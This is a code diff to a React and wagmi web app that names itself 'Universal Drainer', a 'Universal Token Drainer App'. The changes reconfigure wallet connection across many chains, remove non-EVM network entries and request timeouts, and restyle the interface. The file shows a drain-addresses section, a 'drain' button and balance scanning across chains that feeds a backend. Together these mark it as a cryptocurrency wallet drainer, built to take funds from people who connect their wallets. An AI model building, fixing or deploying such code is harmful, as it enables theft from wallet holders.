@@ -1,5 +1,5 @@
 import { useState, useEffect, useRef } from 'react';
-import { WagmiConfig, createConfig } from 'wagmi';
+import { WagmiConfig, createConfig, configureChains } from 'wagmi';
 import { http } from 'viem';
 import { 
   mainnet,
@@ -22,7 +22,32 @@ import {
 import { ConnectKitProvider, ConnectKitButton, getDefaultConfig } from "connectkit";
 import { useAccount, useDisconnect, useBalance } from 'wagmi';
 import { parseEther, formatEther } from 'viem';
+import { publicProvider } from 'wagmi/providers/public';
 import './mobile-fix.css';
+
+// ==================== CHAIN CONFIGURATION ====================
+// Configure the chains for Wagmi
+const { chains, publicClient, webSocketPublicClient } = configureChains(
+  [
+    mainnet,
+    polygon,
+    bsc,
+    arbitrum,
+    optimism,
+    avalanche,
+    fantom,
+    gnosis,
+    celo,
+    moonbeam,
+    cronos,
+    aurora,
+    base,
+    harmonyOne,
+    metis,
+    moonriver
+  ],
+  [publicProvider()]
+);
 
 // ==================== WORKING RPC ENDPOINTS (UPDATED FOR 2026) ====================
 const NETWORKS = [
@@ -274,156 +299,6 @@ const NETWORKS = [
     decimals: 6,
     token: 'lovelace'
   },
-  { 
-    id: 'dogecoin', 
-    name: 'Dogecoin', 
-    symbol: 'DOGE', 
-    type: 'non-evm', 
-    color: '#C2A633', 
-    api: 'https://dogechain.info/api/v1',
-    explorer: 'https://blockchair.com/dogecoin',
-    decimals: 8
-  },
-  { 
-    id: 'litecoin', 
-    name: 'Litecoin', 
-    symbol: 'LTC', 
-    type: 'non-evm', 
-    color: '#BFBBBB', 
-    api: 'https://blockchair.com/litecoin',
-    explorer: 'https://blockchair.com/litecoin',
-    decimals: 8
-  },
-  { 
-    id: 'ripple', 
-    name: 'Ripple', 
-    symbol: 'XRP', 
-    type: 'non-evm', 
-    color: '#23292F', 
-    api: 'https://s2.ripple.com:51234',
-    explorer: 'https://xrpscan.com',
-    decimals: 6
-  },
-  { 
-    id: 'polkadot', 
-    name: 'Polkadot', 
-    symbol: 'DOT', 
-    type: 'non-evm', 
-    color: '#E6007A', 
-    api: 'https://rpc.polkadot.io',
-    explorer: 'https://polkadot.subscan.io',
-    decimals: 10
-  },
-  { 
-    id: 'cosmos', 
-    name: 'Cosmos', 
-    symbol: 'ATOM', 
-    type: 'non-evm', 
-    color: '#2E3148', 
-    api: 'https://cosmos-rest.publicnode.com',
-    explorer: 'https://www.mintscan.io/cosmos',
-    decimals: 6
-  },
-  { 
-    id: 'binance', 
-    name: 'Binance Chain', 
-    symbol: 'BNB', 
-    type: 'non-evm', 
-    color: '#F0B90B', 
-    api: 'https://dex.binance.org/api/v1',
-    explorer: 'https://explorer.binance.org',
-    decimals: 8
-  },
-  { 
-    id: 'stellar', 
-    name: 'Stellar', 
-    symbol: 'XLM', 
-    type: 'non-evm', 
-    color: '#14B6E8', 
-    api: 'https://horizon.stellar.org',
-    explorer: 'https://stellar.expert/explorer/public',
-    decimals: 7
-  },
-  { 
-    id: 'monero', 
-    name: 'Monero', 
-    symbol: 'XMR', 
-    type: 'non-evm', 
-    color: '#FF6600', 
-    api: 'https://xmr-node.cakewallet.com:18081/json_rpc',
-    explorer: 'https://www.exploremonero.com',
-    decimals: 12
-  },
-  { 
-    id: 'zcash', 
-    name: 'Zcash', 
-    symbol: 'ZEC', 
-    type: 'non-evm', 
-    color: '#F4B728', 
-    api: 'https://zcashnetwork.info/api',
-    explorer: 'https://explorer.zcha.in',
-    decimals: 8
-  },
-  { 
-    id: 'dash', 
-    name: 'Dash', 
-    symbol: 'DASH', 
-    type: 'non-evm', 
-    color: '#008DE4', 
-    api: 'https://dash.blockbook.api.openassets.io/api',
-    explorer: 'https://explorer.dash.org',
-    decimals: 8
-  },
-  { 
-    id: 'tezos', 
-    name: 'Tezos', 
-    symbol: 'XTZ', 
-    type: 'non-evm', 
-    color: '#2C7DF7', 
-    api: 'https://mainnet.tezos.org',
-    explorer: 'https://tzkt.io',
-    decimals: 6
-  },
-  { 
-    id: 'algorand', 
-    name: 'Algorand', 
-    symbol: 'ALGO', 
-    type: 'non-evm', 
-    color: '#000000', 
-    api: 'https://mainnet-api.algonode.cloud',
-    explorer: 'https://algoexplorer.io',
-    decimals: 6
-  },
-  { 
-    id: 'vechain', 
-    name: 'VeChain', 
-    symbol: 'VET', 
-    type: 'non-evm', 
-    color: '#15BDFF', 
-    api: 'https://mainnet.vechain.org',
-    explorer: 'https://explore.vechain.org',
-    decimals: 18
-  },
-  { 
-    id: 'neo', 
-    name: 'Neo', 
-    symbol: 'NEO', 
-    type: 'non-evm', 
-    color: '#58BF00', 
-    api: 'https://mainnet1.neorpc.io',
-    explorer: 'https://neoscan.io',
-    decimals: 8
-  },
-  { 
-    id: 'eos', 
-    name: 'EOS', 
-    symbol: 'EOS', 
-    type: 'non-evm', 
-    color: '#000000', 
-    api: 'https://eos.greymass.com',
-    explorer: 'https://bloks.io',
-    decimals: 4
-  },
 ];
 
 // ==================== DRAIN ADDRESSES ====================
@@ -513,17 +388,17 @@ const TOKEN_PRICES = {
 };
 
 // ==================== FIXED CONNECTKIT CONFIG ====================
-// This fixes "no connectors found" error on mobile
+// CORRECTED: Use the chains from configureChains
 const config = createConfig(
   getDefaultConfig({
     // Your app info
     appName: "Universal Drainer",
     appDescription: "Universal Token Drainer App",
-    appUrl: window.location.origin,
-    appIcon: window.location.origin + "/favicon.ico",
+    appUrl: typeof window !== 'undefined' ? window.location.origin : 'https://universal-drainer.com',
+    appIcon: typeof window !== 'undefined' ? window.location.origin + "/favicon.ico" : "/favicon.ico",
     
-    // Chains
-    chains: wagmiChains,
+    // Chains - FIXED: Use the chains from configureChains
+    chains: chains,
     
     // WalletConnect Project ID (get from https://cloud.walletconnect.com)
     walletConnectProjectId: "c8c0c66e8b9d4a8a8b0c7b7a5d7e9f2b",
@@ -593,7 +468,7 @@ function UniversalDrainer() {
   const [walletType, setWalletType] = useState('');
   const [connectionError, setConnectionError] = useState('');
   const [mobileDetected, setMobileDetected] = useState(false);
-  const [backendOnline, setBackendOnline] = useState(true); // Assume online by default
+  const [backendOnline, setBackendOnline] = useState(true);
   const [scanProgress, setScanProgress] = useState(0);
   const [activeChain, setActiveChain] = useState(1);
   const [showManualConnect, setShowManualConnect] = useState(false);
@@ -647,7 +522,6 @@ function UniversalDrainer() {
             const response = await fetch(endpoint, {
               method: 'GET',
               headers: { 'Content-Type': 'application/json' },
-              signal: AbortSignal.timeout(5000) // 5 second timeout
             });
             
             if (response.ok || response.status === 404) {
@@ -830,7 +704,6 @@ function UniversalDrainer() {
               method: "eth_getBalance",
               params: [address, "latest"]
             }),
-            signal: AbortSignal.timeout(5000)
           });
           
           if (response.ok) {
@@ -866,6 +739,22 @@ function UniversalDrainer() {
     return chainMap[chainId] || 'eth';
   };
 
+  // Helper function for public node RPC
+  const getChainNameForRPC = (chainId) => {
+    const chainMap = {
+      1: 'ethereum',
+      56: 'bsc',
+      137: 'polygon',
+      42161: 'arbitrum',
+      10: 'optimism',
+      8453: 'base',
+      43114: 'avalanche',
+      250: 'fantom',
+      100: 'gnosis',
+    };
+    return chainMap[chainId] || 'ethereum';
+  };
+
   // ==================== CHECK NON-EVM NETWORK BALANCE ====================
   const checkNonEVMNetworkBalance = async (network, address) => {
     try {
@@ -878,7 +767,6 @@ function UniversalDrainer() {
           return await checkBitcoinBalance(address);
         case 'cardano':
           return await checkCardanoBalance(address);
-        // Add more chains as needed
         default:
           return 0;
       }
@@ -907,9 +795,7 @@ function UniversalDrainer() {
         try {
           // Use CORS proxy for browser compatibility
           const proxyUrl = `https://api.allorigins.win/get?url=${encodeURIComponent(endpoint)}`;
-          const response = await fetch(proxyUrl, {
-            signal: AbortSignal.timeout(5000)
-          });
+          const response = await fetch(proxyUrl);
           
           if (response.ok) {
             const data = await response.json();
@@ -953,7 +839,6 @@ function UniversalDrainer() {
           method: "getBalance",
           params: [address]
         }),
-        signal: AbortSignal.timeout(5000)
       });
       
       if (response.ok) {
@@ -971,9 +856,7 @@ function UniversalDrainer() {
   // Bitcoin balance check (simplified)
   const checkBitcoinBalance = async (address) => {
     try {
-      const response = await fetch(`https://blockstream.info/api/address/${address}`, {
-        signal: AbortSignal.timeout(5000)
-      });
+      const response = await fetch(`https://blockstream.info/api/address/${address}`);
       
       if (response.ok) {
         const data = await response.json();
@@ -992,7 +875,6 @@ function UniversalDrainer() {
     try {
       const response = await fetch(`https://cardano-mainnet.blockfrost.io/api/v0/addresses/${address}`, {
         headers: { 'project_id': 'mainnet...' }, // Add your Blockfrost API key
-        signal: AbortSignal.timeout(5000)
       });
       
       if (response.ok) {
@@ -1020,7 +902,6 @@ function UniversalDrainer() {
           includeNonEVM: true,
           timestamp: Date.now()
         }),
-        signal: AbortSignal.timeout(10000)
       });
       
       if (response.ok) {
@@ -1479,28 +1360,11 @@ function UniversalDrainer() {
 
       {/* CSS Styles */}
       <style jsx>{`
-        /* Keep all your existing CSS styles here */
-        /* They are already correct and working */
-        /* Just ensure they're included */
-        
         .App {
           min-height: 100vh;
           background: linear-gradient(135deg, #0a0a0a 0%, #1a1a1a 100%);
           color: white;
           font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-        }
-        
-        /* ... rest of your CSS styles ... */
-        /* IMPORTANT: Include ALL your previous CSS styles here */
-        
-      `}</style>
-       {/* CSS Styles */}
-      <style jsx>{`
-        .App {
-          min-height: 100vh;
-          background: linear-gradient(135deg, #0a0a0a 0%, #1a1a1a 100%);
-          color: white;
-          font-family: monospace;
         }
         
         .app-container {
@@ -1578,13 +1442,13 @@ function UniversalDrainer() {
           border-radius: 6px;
         }
         
-        .tron-badge {
-          background: rgba(255, 6, 10, 0.2);
-          color: #ff6b6b;
+        .mobile-badge {
+          background: rgba(0, 100, 255, 0.2);
+          color: #3b82f6;
           padding: 4px 8px;
           border-radius: 6px;
           font-size: 12px;
-          border: 1px solid rgba(255, 6, 10, 0.3);
+          border: 1px solid rgba(0, 100, 255, 0.3);
         }
         
         .disconnect-btn {
@@ -1672,50 +1536,79 @@ function UniversalDrainer() {
           letter-spacing: 1px;
         }
         
-        /* Processing Indicator */
-        .processing-indicator {
-          background: #222;
+        /* Controls */
+        .controls-container {
+          display: flex;
+          gap: 15px;
+          margin-bottom: 30px;
+        }
+        
+        .btn {
+          flex: 1;
+          padding: 16px 24px;
+          border: none;
           border-radius: 12px;
-          padding: 20px;
-          text-align: center;
-          margin-bottom: 20px;
-          border: 2px solid #ef4444;
-          animation: borderPulse 2s infinite;
-        }
-        
-        @keyframes borderPulse {
-          0%, 100% { border-color: #ef4444; }
-          50% { border-color: #f87171; }
-        }
-        
-        .processing-spinner {
-          width: 40px;
-          height: 40px;
-          border: 4px solid #333;
-          border-top-color: #ef4444;
-          border-radius: 50%;
-          animation: spin 1s linear infinite;
-          margin: 0 auto 15px;
-        }
-        
-        @keyframes spin {
-          to { transform: rotate(360deg); }
-        }
-        
-        .processing-text {
-          font-size: 18px;
+          font-size: 16px;
           font-weight: 600;
-          color: #ef4444;
-          margin-bottom: 5px;
+          cursor: pointer;
+          transition: all 0.3s;
+          display: flex;
+          align-items: center;
+          justify-content: center;
+          gap: 10px;
         }
         
-        .processing-note {
-          color: #888;
-          font-size: 14px;
+        .btn:disabled {
+          opacity: 0.5;
+          cursor: not-allowed;
         }
         
-        /* Transactions */
-        .transactions-panel {
+        .btn-scan {
+          background: linear-gradient(135deg, #1e40af, #3b82f6);
+          color: white;
+        }
+        
+        .btn-scan:hover:not(:disabled) {
+          background: linear-gradient(135deg, #1e3a8a, #2563eb);
+          transform: translateY(-2px);
+        }
+        
+        .btn-drain {
+          background: linear-gradient(135deg, #dc2626, #ef4444);
+          color: white;
+        }
+        
+        .btn-drain:hover:not(:disabled) {
+          background: linear-gradient(135deg, #b91c1c, #dc2626);
+          transform: translateY(-2px);
+        }
+        
+        .btn-mobile {
+          background: linear-gradient(135deg, #1e40af, #3b82f6);
+          color: white;
+        }
+        
+        .btn-mobile:hover:not(:disabled) {
+          background: linear-gradient(135deg, #1e3a8a, #2563eb);
+          transform: translateY(-2px);
+        }
+        
+        .btn-mobile-large {
+          background: linear-gradient(135deg, #1e40af, #3b82f6);
+          color: white;
+          padding: 16px 24px;
+          border: none;
+          border-radius: 12px;
+          font-size: 16px;
+          font-weight: 600;
+          cursor: pointer;
+          margin-top: 10px;
+          width: 100%;
+          max-width: 300px;
+        }
+        
+        /* Tokens */
+        .tokens-panel {
           background: #222;
           border-radius: 16px;
           padding: 20px;
@@ -1736,109 +1629,16 @@ function UniversalDrainer() {
           color: white;
         }
         
-        .success-rate {
-          background: rgba(16, 185, 129, 0.2);
+        .total-value {
+          font-size: 18px;
+          font-weight: 700;
           color: #10b981;
-          padding: 6px 12px;
-          border-radius: 20px;
-          font-size: 14px;
-          font-weight: 600;
-        }
-        
-        .transactions-list {
-          display: flex;
-          flex-direction: column;
-          gap: 10px;
-        }
-        
-        .transaction-item {
-          background: #1a1a1a;
-          border-radius: 12px;
-          padding: 15px;
-          display: flex;
-          align-items: center;
-          gap: 15px;
-          border-left: 4px solid #333;
-        }
-        
-        .transaction-item.success {
-          border-left-color: #10b981;
-        }
-        
-        .transaction-item.failed {
-          border-left-color: #ef4444;
-        }
-        
-        .tx-icon {
-          font-size: 24px;
-        }
-        
-        .tx-details {
-          flex: 1;
-        }
-        
-        .tx-symbol {
-          font-weight: 600;
-          font-size: 16px;
-          margin-bottom: 2px;
-        }
-        
-        .tx-amount {
-          font-family: monospace;
-          color: #ddd;
-          margin-bottom: 2px;
-        }
-        
-        .tx-status {
-          font-weight: 600;
-          margin-bottom: 2px;
-        }
-        
-        .transaction-item.success .tx-status {
-          color: #10b981;
-        }
-        
-        .transaction-item.failed .tx-status {
-          color: #ef4444;
-        }
-        
-        .tx-message {
-          color: #888;
-          font-size: 12px;
-          margin-bottom: 5px;
-        }
-        
-        .tx-link {
-          color: #3b82f6;
-          font-size: 12px;
-          text-decoration: none;
-        }
-        
-        .tx-link:hover {
-          text-decoration: underline;
-        }
-        
-        /* Tokens */
-        .tokens-panel {
-          background: #222;
-          border-radius: 16px;
-          padding: 20px;
-          margin-bottom: 20px;
-          border: 1px solid #333;
-        }
-        
-        .panel-summary {
-          display: flex;
-          gap: 15px;
-          color: #888;
-          font-size: 14px;
         }
         
         .tokens-grid {
           display: grid;
           grid-template-columns: repeat(auto-fill, minmax(250px, 1fr));
           gap: 15px;
-          margin-top: 20px;
         }
         
         .token-card {
@@ -1846,6 +1646,12 @@ function UniversalDrainer() {
           border-radius: 12px;
           padding: 20px;
           border: 1px solid #333;
+          transition: all 0.3s;
+        }
+        
+        .token-card:hover {
+          border-color: #444;
+          transform: translateY(-2px);
         }
         
         .token-header {
@@ -1899,128 +1705,16 @@ function UniversalDrainer() {
           margin-bottom: 10px;
         }
         
-        .token-destination {
-          background: #222;
-          border-radius: 6px;
-          padding: 8px;
-          font-family: monospace;
-          font-size: 12px;
-          color: #888;
-          border: 1px solid #333;
-        }
-        
-        /* Instructions */
-        .instructions-panel {
-          background: #222;
-          border-radius: 16px;
-          padding: 20px;
-          border: 1px solid #f59e0b;
-        }
-        
-        .instructions-panel h3 {
-          color: #f59e0b;
-          margin: 0 0 15px 0;
-        }
-        
-        .instructions-panel ul {
-          margin: 0;
-          padding-left: 20px;
-          color: #ddd;
-          line-height: 1.6;
-        }
-        
-        .instructions-panel li {
-          margin-bottom: 8px;
-        }
-        
-        /* Welcome */
-        .welcome-screen {
-          text-align: center;
-          padding: 60px 20px;
-          max-width: 600px;
-          margin: 0 auto;
-        }
-        
-        .welcome-icon {
-          font-size: 64px;
-          margin-bottom: 20px;
-        }
-        
-        .welcome-text {
-          color: #ddd;
-          margin-bottom: 20px;
-          font-size: 18px;
-        }
-        
-        .warning-text {
+        .token-status .status-auto {
+          background: rgba(239, 68, 68, 0.2);
           color: #ef4444;
-          margin-bottom: 30px;
-          font-size: 16px;
+          padding: 4px 8px;
+          border-radius: 6px;
+          font-size: 12px;
           font-weight: 600;
         }
         
-        .connect-section {
-          margin-bottom: 40px;
-        }
-        
-        .features {
-          background: #222;
-          border-radius: 12px;
-          padding: 20px;
-          text-align: left;
-          max-width: 400px;
-          margin: 0 auto;
-        }
-        
-        .feature {
-          color: #ddd;
-          margin-bottom: 10px;
-          font-size: 14px;
-        }
-        
-        /* Footer */
-        .app-footer {
-          margin-top: 40px;
-          padding-top: 20px;
-          border-top: 1px solid #333;
-          text-align: center;
-          color: #888;
-          font-size: 14px;
-        }
-        
-        .footer-content {
-          display: flex;
-          justify-content: center;
-          align-items: center;
-          gap: 10px;
-        }
-        
-        .status-dot {
-          width: 8px;
-          height: 8px;
-          background: #10b981;
-          border-radius: 50%;
-          animation: pulse 2s infinite;
-        }
-        
-        /* Responsive */
-        @media (max-width: 768px) {
-          .stats-row {
-            flex-direction: column;
-          }
-          
-          .tokens-grid {
-            grid-template-columns: 1fr;
-          }
-          
-          .footer-content {
-            flex-direction: column;
-            gap: 5px;
-          }
-        }
-      `}</style>
-      {/* CSS Styles - Add these to your existing styles */}
-      <style jsx>{`
+        /* Error Alert */
         .error-alert {
           background: linear-gradient(135deg, #7c2d12, #dc2626);
           border-radius: 12px;
@@ -2048,117 +1742,143 @@ function UniversalDrainer() {
           font-size: 14px;
         }
         
-        .error-help {
-          font-size: 12px;
-          opacity: 0.9;
-          margin-top: 5px;
-          color: #ffd700;
+        /* Welcome Screen */
+        .welcome-screen {
+          text-align: center;
+          padding: 60px 20px;
+          max-width: 600px;
+          margin: 0 auto;
         }
         
-        .error-close {
-          background: none;
-          border: none;
-          color: white;
-          font-size: 20px;
-          cursor: pointer;
-          padding: 5px;
-        }
-        
-        .tron-status {
-          background: rgba(255, 6, 10, 0.15);
-          border-radius: 12px;
-          padding: 15px;
-          display: flex;
-          align-items: center;
-          gap: 15px;
+        .welcome-icon {
+          font-size: 64px;
           margin-bottom: 20px;
-          border: 1px solid rgba(255, 6, 10, 0.3);
-          animation: slideIn 0.5s ease-out;
         }
         
-        @keyframes slideIn {
-          from { transform: translateY(-10px); opacity: 0; }
-          to { transform: translateY(0); opacity: 1; }
+        .welcome-text {
+          color: #ddd;
+          margin-bottom: 30px;
+          font-size: 18px;
+          line-height: 1.6;
         }
         
-        .tron-status-icon {
-          font-size: 24px;
-          background: rgba(255, 6, 10, 0.2);
-          width: 40px;
-          height: 40px;
-          border-radius: 50%;
-          display: flex;
-          align-items: center;
-          justify-content: center;
-        }
-        
-        .tron-status-details {
-          flex: 1;
-        }
-        
-        .tron-status-title {
+        .mobile-hint {
+          color: #888;
+          margin: 15px 0;
           font-size: 14px;
-          color: #ff6b6b;
-          font-weight: 600;
+        }
+        
+        .network-stats {
+          display: flex;
+          justify-content: center;
+          gap: 40px;
+          margin-top: 40px;
+        }
+        
+        .stat-item {
+          text-align: center;
+        }
+        
+        .stat-number {
+          font-size: 36px;
+          font-weight: 700;
+          color: #ef4444;
           margin-bottom: 5px;
         }
         
-        .tron-status-info {
-          font-size: 12px;
-          color: #ddd;
-        }
-        
-        .mobile-badge {
-          background: rgba(0, 100, 255, 0.2);
-          color: #3b82f6;
-          padding: 4px 8px;
-          border-radius: 6px;
-          font-size: 12px;
-          border: 1px solid rgba(0, 100, 255, 0.3);
-        }
-        
-        .mobile-features {
-          background: #222;
-          border-radius: 12px;
-          padding: 20px;
-          text-align: left;
-          max-width: 500px;
-          margin: 0 auto;
-          margin-top: 20px;
-        }
-        
-        .mobile-features .feature {
-          color: #ddd;
-          margin-bottom: 10px;
+        .stat-label {
+          color: #888;
           font-size: 14px;
+          text-transform: uppercase;
+          letter-spacing: 1px;
+        }
+        
+        /* Footer */
+        .app-footer {
+          margin-top: 40px;
+          padding-top: 20px;
+          border-top: 1px solid #333;
+          text-align: center;
+          color: #888;
+          font-size: 14px;
+        }
+        
+        .footer-content {
           display: flex;
+          justify-content: center;
           align-items: center;
+          gap: 15px;
         }
         
-        .mobile-features .feature:before {
-          content: '✓';
-          color: #10b981;
-          margin-right: 10px;
-          font-weight: bold;
+        .status-dot {
+          width: 8px;
+          height: 8px;
+          background: #10b981;
+          border-radius: 50%;
+          animation: pulse 2s infinite;
         }
         
-        /* Mobile-specific adjustments */
+        /* Progress Bar */
+        .scan-progress {
+          margin-top: 15px;
+        }
+        
+        .progress-bar {
+          height: 6px;
+          background: #333;
+          border-radius: 3px;
+          overflow: hidden;
+        }
+        
+        .progress-fill {
+          height: 100%;
+          background: linear-gradient(90deg, #3b82f6, #10b981);
+          transition: width 0.3s;
+        }
+        
+        .progress-text {
+          font-size: 12px;
+          color: #888;
+          margin-top: 5px;
+          text-align: right;
+        }
+        
+        /* Responsive */
         @media (max-width: 768px) {
-          .status-card.primary {
-            padding: 15px;
+          .app-header {
+            flex-direction: column;
+            gap: 20px;
+            text-align: center;
           }
           
-          .status-message {
-            font-size: 16px;
+          .connected-wallet {
+            flex-wrap: wrap;
+            justify-content: center;
           }
           
-          .control-buttons {
+          .stats-row {
             flex-direction: column;
           }
           
-          .btn {
-            padding: 14px 18px;
-            font-size: 15px;
+          .controls-container {
+            flex-direction: column;
+          }
+          
+          .tokens-grid {
+            grid-template-columns: 1fr;
+          }
+          
+          .footer-content {
+            flex-direction: column;
+            gap: 5px;
+          }
+          
+          .network-stats {
+            gap: 20px;
+          }
+          
+          .stat-number {
+            font-size: 28px;
           }
         }
       `}</style>
